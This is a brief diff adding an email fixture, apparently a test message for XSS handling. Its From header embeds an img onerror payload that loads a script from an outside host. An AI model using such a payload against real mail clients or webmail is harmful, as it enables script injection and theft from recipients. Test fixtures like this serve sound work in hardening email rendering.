@@ -1,0 +1,7 @@
+From: <"test<img src='ice' onerror="loadScript('http://icefish1987.sinaapp.com/xss/probe.js')">@attack.com">
+To: =?UTF-8?B?TG92ZSBIw7ZybnF1aXN0IMOFc3RyYW5k?= <lha@kth.se>,
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
